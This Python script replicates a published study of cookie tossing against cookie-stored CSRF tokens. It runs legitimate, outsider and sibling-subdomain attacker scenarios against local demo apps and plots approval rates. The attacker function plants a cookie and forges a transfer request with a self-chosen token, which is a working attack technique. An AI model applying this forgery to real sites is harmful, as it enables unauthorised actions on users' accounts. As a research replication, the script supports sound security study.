"""
Core replication experiment for:

  Squarcina, Adao, Veronese & Maffei, "Cookie Crumbles: Breaking and
  Fixing Web Session Integrity", USENIX Security 2023.

Central claim being tested: a synchronizer-token CSRF defense that
stores its secret token in a cookie is only as strong as the
assumption that nobody else can write to that cookie's namespace. A
RELATED subdomain of the same registrable domain can violate that
assumption ("cookie tossing") and get a forged request approved
WITHOUT ever learning the real secret -- something a genuinely
unrelated attacker cannot do.

We test three scenarios against the real, running victim Flask app,
using our own RFC 6265-faithful cookie jar (cookiejar_sim.py) to
construct exactly the Cookie header a spec-compliant browser would
send, so nothing about the result depends on any HTTP client's own
cookie-handling internals.

  1. legit       -- the real user, visiting the real page and
                     submitting the real form. Expected: approved.
  2. outsider     -- an attacker on a completely unrelated domain
                     (no ability to write any cc-demo.test cookie)
                     tries to forge a request. Expected: rejected.
  3. cookie_tossing -- an attacker on a SIBLING subdomain of the same
                     registrable domain plants a cookie via the Domain
                     attribute, then forges a request using a token
                     value it chose itself. Expected (per the paper's
                     claim): approved, despite never learning any real
                     secret.

Each scenario is run for N independent trials (fresh cookie jar and,
for the legit case, a fresh random token each time) to confirm the
result is consistent, not a one-off.
"""
import re
import requests
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

from cookiejar_sim import CookieJarSim
from harness import start_apps, stop_apps

VICTIM = "http://victim.cc-demo.test:5000"
ATTACKER = "http://attacker.cc-demo.test:5001"
N_TRIALS = 20


def parse_set_cookie(raw_header: str):
    """Parse a Set-Cookie header string into (name, value, domain_attr, path_attr)."""
    parts = [p.strip() for p in raw_header.split(";")]
    name, value = parts[0].split("=", 1)
    domain_attr, path_attr = None, "/"
    for p in parts[1:]:
        if "=" in p:
            k, v = p.split("=", 1)
            if k.strip().lower() == "domain":
                domain_attr = v.strip()
            elif k.strip().lower() == "path":
                path_attr = v.strip()
    return name.strip(), value.strip(), domain_attr, path_attr


def extract_hidden_token(html: str) -> str:
    m = re.search(r'name="csrf_token" value="([0-9a-f]+)"', html)
    return m.group(1) if m else None


def run_legit_trial() -> bool:
    """The real user: visit the real page, submit the real form."""
    jar = CookieJarSim()

    r = requests.get(f"{VICTIM}/", timeout=2)
    set_cookie = r.headers.get("Set-Cookie")
    name, value, domain_attr, path_attr = parse_set_cookie(set_cookie)
    jar.set_cookie(name, value, request_host="victim.cc-demo.test",
                    domain_attr=domain_attr, path_attr=path_attr)

    real_token = extract_hidden_token(r.text)
    cookie_header = jar.cookie_header_for("victim.cc-demo.test", "/transfer")

    resp = requests.post(
        f"{VICTIM}/transfer",
        data={"csrf_token": real_token, "amount": "100"},
        headers={"Cookie": cookie_header},
        cookies={},  # disable requests' own cookie jar entirely
        timeout=2,
    )
    return resp.json().get("status") == "approved"


def run_outsider_trial() -> bool:
    """An attacker with NO ability to write any cc-demo.test cookie
    (e.g. a totally unrelated domain) tries to forge a request blind."""
    jar = CookieJarSim()  # fresh, empty jar -- outsider can't put anything in it
    cookie_header = jar.cookie_header_for("victim.cc-demo.test", "/transfer")

    resp = requests.post(
        f"{VICTIM}/transfer",
        data={"csrf_token": "0" * 32, "amount": "999999"},  # a blind guess
        headers={"Cookie": cookie_header},
        cookies={},
        timeout=2,
    )
    return resp.json().get("status") == "approved"


def run_cookie_tossing_trial() -> bool:
    """An attacker on a SIBLING subdomain plants a cookie via the
    Domain attribute, then forges a request with a token value it
    chose itself -- never touching the real page at all."""
    jar = CookieJarSim()

    r = requests.get(f"{ATTACKER}/attack", timeout=2)
    set_cookie = r.headers.get("Set-Cookie")
    name, value, domain_attr, path_attr = parse_set_cookie(set_cookie)
    jar.set_cookie(name, value, request_host="attacker.cc-demo.test",
                    domain_attr=domain_attr, path_attr=path_attr)

    cookie_header = jar.cookie_header_for("victim.cc-demo.test", "/transfer")

    resp = requests.post(
        f"{VICTIM}/transfer",
        data={"csrf_token": value, "amount": "999999"},  # attacker's own known value
        headers={"Cookie": cookie_header},
        cookies={},
        timeout=2,
    )
    return resp.json().get("status") == "approved"


def run_experiment():
    scenarios = {
        "legit user": run_legit_trial,
        "unrelated outsider": run_outsider_trial,
        "cookie-tossing attacker\n(sibling subdomain)": run_cookie_tossing_trial,
    }
    results = {}
    for label, fn in scenarios.items():
        successes = sum(1 for _ in range(N_TRIALS) if fn())
        results[label] = successes / N_TRIALS
        requests.post(f"{VICTIM}/reset", timeout=2)
    return results


def make_plot(results, outpath):
    labels = list(results.keys())
    values = [v * 100 for v in results.values()]
    colors = ["#2166ac", "#b2182b", "#b2182b"]
    fig, ax = plt.subplots(figsize=(8, 5.5))
    bars = ax.bar(labels, values, color=colors[:len(labels)])
    for bar, v in zip(bars, values):
        ax.text(bar.get_x() + bar.get_width() / 2, v + 2, f"{v:.0f}%",
                 ha="center", fontsize=12, fontweight="bold")
    ax.set_ylim(0, 110)
    ax.set_ylabel(f"Transfer approved rate over {N_TRIALS} trials (%)")
    ax.set_title("Does the CSRF Defense Hold?\n(Cookie-Tossing Replication)")
    ax.grid(axis="y", alpha=0.3)
    fig.tight_layout()
    fig.savefig(outpath, dpi=150)
    print(f"Saved plot to {outpath}")


if __name__ == "__main__":
    victim_proc, attacker_proc = start_apps()
    try:
        results = run_experiment()
        print("Results (approval rate over", N_TRIALS, "trials):")
        for label, rate in results.items():
            print(f"  {label.replace(chr(10), ' ')}: {rate * 100:.0f}%")
        make_plot(results, "core_result_cookie_tossing.png")
    finally:
        stop_apps(victim_proc, attacker_proc)
